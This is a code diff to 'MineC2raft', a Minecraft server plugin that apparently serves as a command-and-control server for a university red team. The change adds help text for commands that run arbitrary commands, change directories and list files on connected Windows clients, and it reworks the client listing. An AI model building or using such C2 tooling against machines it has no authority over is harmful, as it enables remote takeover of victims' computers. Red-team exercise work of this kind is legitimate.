@@ -23,10 +23,13 @@ public class Server {
     public static final String RED = "§4";
     public static final String GREEN = "§2";
     public static final String YELLOW = "§e";
+    public static final String BOLD = "§l";
+    public static final String GLITCH = "§k";    
     public static final String RESET = "§f";
 
+
     private static boolean exists = false;
-    private static final double VERSION_NUM = 0.1; //version number (change when I feel cheeky ;)
+    private static final double VERSION_NUM = 1.0; //version number (change when I feel cheeky ;)
     public static final CopyOnWriteArrayList<ClientHandler> clients = new CopyOnWriteArrayList<>(); // array of clients as threads.
 
     private static ServerSocket serverSocket; //socket of the server duh
@@ -79,7 +82,7 @@ public class Server {
             } 
         });
         
-        Bukkit.broadcastMessage(YELLOW + "Type '/coms' for a list of commands." + RESET);
+        Bukkit.broadcastMessage(YELLOW + "Type '/c2help' for a list of commands." + RESET);
     }    
 
     /**
@@ -102,31 +105,28 @@ public class Server {
                 returnStr = broadcast(reply, null, target);
                 break;
             case "coms", "commands", "cmds", "HELP": 
-                reply = "               ********** MineC2raft Commands ***********\n" 
-                            + "os: displays the os of the client.\n"
-                            + "user: displays the name of the client.\n" 
-                            + "quit: exits the client port.\n" 
-                            + "clients: displays all connected clients.\n"
-                            + "about: about the program.\n"  
+                return "               ********** MineC2raft Commands ***********\n" 
+                            + "/targets: displays all connected clients.\n"
+                            + "/cd [client]: Change directory of specified [client].\n"
+                            + "/cmd [command] [client]: Sends [command] to the specified [client].\n"
+                            + "/dir [client]: List current directory of specified [client].\n"
+                            + "/credits: about the program.\n"
                             + "       ******************************************\n\n" 
                             + "WINDOWS ONLY\n(i'll add linux soon) but like lowk you can use a remote terminal \n" 
                             + "Thats all you need to know foo\n";
-                  return reply;
+                  
             case "poop":
                 for(int i = 1; i <= 100; i++) {
-                    System.out.println(i + ": Poop");
+                    Bukkit.broadcastMessage(i + ": Poop");
                 }
                 break;
-            case "about", "abt":
-                reply = "\n░▒▓ MINEC2RAFT ▓▒░\n" 
+            case "about":
+                reply = "\n" + GLITCH + "a" + RESET + "░▒▓ MINEC2RAFT ▓▒░" + GLITCH + "a" + RESET + "\n" 
                         + "Version: " + VERSION_NUM 
                         + "\nWritten by  for RIT's Red Team.\n" 
                         + "For fun too lowk...\n\n" 
                         + "A dud?\n/give @p oak_sapling 100";
-                  return reply;
-            case "sockets", "clients", "list", "lst", "array", "arr": //this does not need to be here anymore but will stay for legacy
-                formatArrLst();
-                break;                
+                  return reply;               
             default: 
                 returnStr = broadcast(cmd, null, target);
                 break;  
@@ -174,14 +174,16 @@ public class Server {
      */
     public static String formatArrLst() {
         String arr = "";
-        if(clients.size() > 0) {
-            arr += GREEN + "\nCurrent Connected Clients:" + RESET + "\n";
-        } else {
+        if(clients.size() == 0) {
             arr += RED + "No connected clients. " + RESET + "\n";
+            return arr;
+        } else {
+            arr += GREEN + "\nCurrent Connected Clients:" + RESET + "\n";
+            for(int i = 0; i < clients.size(); i++) {
+                arr += YELLOW + i + ": " + RESET + clients.get(i).getInetAddr() + ", Port " + clients.get(i).getPort() + "\n";
+            }
         }
-        for(int i = 0; i < clients.size(); i++) {
-             arr += YELLOW + i + ": " + RESET + clients.get(i).getInetAddr() + ", Port " + clients.get(i).getPort() + "\n";
-        }
+        
         arr += "all: broadcast to all clients";
         return arr;
     }
